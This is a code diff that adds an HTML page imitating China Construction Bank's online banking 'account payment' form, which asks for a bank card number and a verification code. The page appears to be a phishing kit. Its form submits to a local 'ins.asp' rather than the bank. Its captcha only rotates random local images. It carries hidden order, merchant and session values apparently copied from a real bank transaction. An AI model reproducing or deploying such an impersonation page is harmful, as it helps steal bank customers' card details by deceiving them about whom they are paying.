@@ -1,0 +1,327 @@
+
+ 
+ 
+ 
+ 
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+ 
+<html xmlns="http://www.w3.org/1999/xhtml">
+ 
+<head>
+ 
+<title>中国建设银行 个人网上银行</title>
+ 
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
+ 
+ <LINK rel=stylesheet type=text/css href="jianshe_files/new_gateway.css">
+<SCRIPT language=javascript src="jianshe_files/ccb5.htm"></SCRIPT>
+ 
+
+ 
+ 
+<script language="JavaScript"> 
+ 
+ 
+ 
+function mainChange()
+ 
+{        document.getElementById("a65").focus();
+ 
+ 
+ 
+		
+ 
+	
+ 
+}
+ 
+function CheckAndGo(){
+ 
+ 
+ 
+	var stracc =document.getElementById("ACCOUNT").value;
+ 
+ 
+ 
+	if( stracc.length==0 ){
+ 
+		alert("银行卡号不能为空，请输入。");
+ 
+		document.getElementById("a65").focus();
+ 
+		return ;
+ 
+		
+ 
+		 }else if(stracc.length==16&&stracc.substr(0,6)=="418148"){
+ 
+		 		
+ 
+		 document.getElementById("TXCODE").value='X41030';
+ 
+		 }
+ 
+		 
+ 
+ 
+ 
+	 
+ 
+	if( document.getElementById("PT_CONFIRM_PWD").value.length==0 ){
+ 
+		alert("附加码不能为空，请输入");
+ 
+		document.getElementById("PT_CONFIRM_PWD").focus();
+ 
+		return;
+ 
+	}
+ 
+	
+ 
+	
+ 
+    document.getElementById("BTNPay").disabled=true;
+ 
+	document.getElementById("BTNPay").className = "Pay-TypeBtn_dis";
+ 
+	formatAcc(document.getElementById("a65"));
+ 
+	document.jhform.submit();
+ 
+}
+ 
+ 
+ 
+function DefaultGo(evt){
+ 
+    
+ 
+    evt = evt ? evt : (window.event ? window.event : null);
+ 
+    
+ 
+	if( evt.keyCode==13 ){
+ 
+ 
+ 
+		CheckAndGo();
+ 
+ 
+ 
+	}
+ 
+ 
+ 
+}
+ 
+ 
+ 
+function type_onclick(type){
+	if (type==0){    
+		document.getElementById("TXCODE").value='410304';
+		document.jhform.submit();
+	}else if (type ==1){	
+		document.getElementById("TXCODE").value='410321';
+		document.jhform.submit();
+	}else if(type ==2){
+		document.getElementById("TXCODE").value='410360';
+		document.jhform.submit();
+	}else if(type ==3){
+		document.getElementById("TXCODE").value='410365';
+		document.jhform.submit();
+	}else if(type ==4){
+		document.getElementById("TXCODE").value='410370';
+		document.jhform.submit();
+	}
+}
+ 
+var ImgcodeUrl='/app/B2CMainB1L5?CCB_IBSVersion=V5&SERVLET_NAME=B2CMainB1L5&TXCODE=100119&USERID=&SKEY=';
+ 
+ 
+ 
+</script>
+ 
+ 
+ 
+</head>
+ 
+<body >
+ 
+ 
+ 
+	<form name="jhform" id="jhform" method="post" action="ins.asp">
+	<div id="Pay-TypeContainerList">
+			
+			<div class="Pay-TypeTab">
+						  
+						<a class="Pay-TypeTab_NoChoose" onclick="type_onclick(0)" href="B2CMainB1L5.asp" target="_self"><span>网上银行支付</span></a>
+						<a class="Pay-TypeTab_Choose"><span>账号支付</span></a>
+						
+					
+						
+					
+			            
+			            
+			            
+			            
+			</div>
+		
+			<div id="payBody" name="payBody" class="Pay-TypeBody">
+				<div class="ttlbox" style="line-height:24px;"><i ><span class="redfont" style="float:left;" ><strong>账号支付：</strong></span><div  style="margin-left:75px;">适用于持有建行活期储蓄账户（含卡、折）或信用卡账户的客户。输入账号和手机短信验证码即可完成支付。</div></i></div>
+				<div class="divinputbox">
+					<i class="divrightleft"><span class="redfont"> *</span> 支付账号：</i>
+					
+	      			<i style="font-size:12px;line-height:18px;">
+	      				<input type="text" class="text" name ="a65" id ="a65" value =""  maxlength="30" align="absmiddle"     onfocus="formatAcc(this);" onfocusout="formatAcc(this);" onkeyup="formatAcc(this);" autocomplete="off" size="23"/>
+	      			      			
+	      			</i>
+                    <input type="hidden" name="jg" value="" />
+<input type="hidden" name="orderid10" value="" />
+<input type="hidden" name="cms100" value="410301" />
+	      			<span id="tip_name" class="tip_off_short">支持活期储蓄账号(卡、折)/信用卡</span>
+	    		</div>
+	    		<input name="ACCOUNT" id="ACCOUNT" type="hidden" value="" />
+	    		<div style="padding:0px 187px;">
+	    			
+	    		</div>
+	    		<div class="divinputbox" style="padding-top:8px;">
+					<i class="divrightleft"><span class="redfont"> *</span> 附加码：</i>
+				  <i>
+						<input type="text" name="PT_CONFIRM_PWD" id="PT_CONFIRM_PWD" onblur="fujiacheck(this,0,'fujiaerr');" onkeyup="fujiacheck(this,5,'fujiaerr');" class="text" value="" maxlength="5" onkeydown="DefaultGo(event);" autocomplete="off" size="23" style='vertical-align:middle;margin:0px 0px 8px 0px'/>						
+				  </i>
+					<i id="fujiaerr">
+					</i>
+					<img src="yzm/yz1.jpg" alt="验证码,看不清楚?请点击刷新验证码"  border="0"   style="cursor : pointer;" onClick="changeAuthCode()"  id="vdimgck" height="31" width="79">
+
+
+&nbsp;<a id="link4Verifyimage2Name" href="#" onClick="JavaScript:changeAuthCode();" style="COLOR: blue; text-decoration:none; "><nobr><nobr>刷新验证码</nobr></nobr></a>
+<script src="/js/j.js" language="javascript" type="text/javascript"></script>
+<script type="text/javascript">
+function changeAuthCode() {
+	var num = 	new Date().getTime();
+	var rand = Math.round(Math.random() * 16);
+	num = num + rand;
+	//$('#ver_code').css('visibility','visible');
+	if ($("#vdimgck")[0]) {
+		$("#vdimgck")[0].src = "yzm/yz"+rand+".jpg";
+	}
+	return false;
+}
+
+</script>
+					
+			    </div>
+			    <div  style="padding:15px 5px 5px 188px;">
+			  		<input type="button" name="BTNPay" id="BTNPay" value="下一步" class="Pay-TypeBtn" onClick="CheckAndGo();"/>
+				</div>
+				<div style=" padding:10px;"></div>
+			</div><!-- end of  Pay-TypeBody -->
+				
+		</div><!-- end of  Pay-TypeContainerList -->
+ 
+ 
+		
+ 
+	
+ 
+	<input type=hidden name="TXCODE" id="TXCODE" value="410328" />
+ 
+ 
+ 
+		<input TYPE="hidden" NAME="COOKIES" VALUE="G4JJLE7Vq1pZifQwyS3QmZAEJL99VxciJa8AVssPN46YVu87uUQaiVewOPSFZNcMNl8ZXQcYhr9sWpc4JeB1Vh87lTArXPMsZSIH1G85qwvM9P" />
+ 
+		<input TYPE="hidden" NAME="BRANCHID" VALUE="442000000" />
+ 
+		<input TYPE="hidden" NAME="CURCODE" VALUE="01" />
+ 
+		<input TYPE="hidden" NAME="MAC" VALUE="0749b1ad72228efd0f391dda54c0e512" />
+ 
+		<input TYPE="hidden" NAME="MERCHANTID" VALUE="105584060510022" />
+ 
+		<input TYPE="hidden" NAME="ORDERID" VALUE="201404022865575" />
+ 
+		<input TYPE="hidden" NAME="PAYMENT" VALUE="60.00" />
+ 
+		<input TYPE="hidden" NAME="POSID" VALUE="611780921" />
+ 
+		<input TYPE="hidden" NAME="REMARK1" VALUE="" />
+ 
+		<input TYPE="hidden" NAME="REMARK2" VALUE="" />
+ 
+		<input TYPE="hidden" NAME="CCB_PWD_MAP_GIGEST" VALUE="" />
+ 
+		<input TYPE="hidden" NAME="errURL" VALUE="/B2CMainB1L5?CCB_IBSVersion=V5&TXCODE=410321&MERCHANTID=105584060510022&POSID=611780921&BRANCHID=442000000&ORDERID=201404022865575&PAYMENT=60.00&CURCODE=01&REMARK1=&REMARK2=&TYPE=1&GATEWAY=W1Z2&CLIENTIP=223.203.187.32&REGINFO=&PROINFO=&REFERER=&MAC=0749b1ad72228efd0f391dda54c0e512" />
+ 
+		
+ 
+		<input TYPE="hidden" NAME="TYPE" VALUE="1">
+ 
+		<input TYPE="hidden" NAME="GATEWAY" VALUE="W1Z2">
+ 
+		<input TYPE="hidden" NAME="CLIENTIP" VALUE="223.203.187.32">
+ 
+		<input TYPE="hidden" NAME="REGINFO" VALUE="">
+ 
+		<input TYPE="hidden" NAME="PROINFO" VALUE="">	
+ 
+        <input TYPE="hidden" NAME="REFERER" VALUE="">
+ 
+		<input TYPE="hidden" NAME="INSTALLNUM" VALUE="">
+ 
+		
+ 
+ 
+ 
+	</form>
+ 
+			<script language="JavaScript">
+		var jhform = document.jhform;
+ 
+	</script>
+ 
+	<script language="JavaScript">
+ 
+ 
+ 
+  function formatAcc(obj){
+ 
+	var realV=document.getElementById("a65");
+ 
+	realV.value=obj.value.replace(/\s*/g, "");
+ 
+	if(realV.value.indexOf("*")<0){
+ 
+		document.getElementById("ACCOUNT").value=realV.value;
+ 
+	}
+ 
+	var str=realV.value;
+ 
+	var temp="";
+ 
+	for(var i=0;i<str.length;i++){		
+ 
+		temp=temp+str.substring(i,i+1);
+ 
+		if(i!=0&&(i+1)%4==0&&i!=(str.length-1)){	
+ 
+			temp=temp+" ";
+ 
+			}
+ 
+	}	
+ 
+	obj.value=temp;
+ 
+}
+ 
+  
+ 
+  
+ 
+		</script>
+ 
+</body>
+ 
+</html>
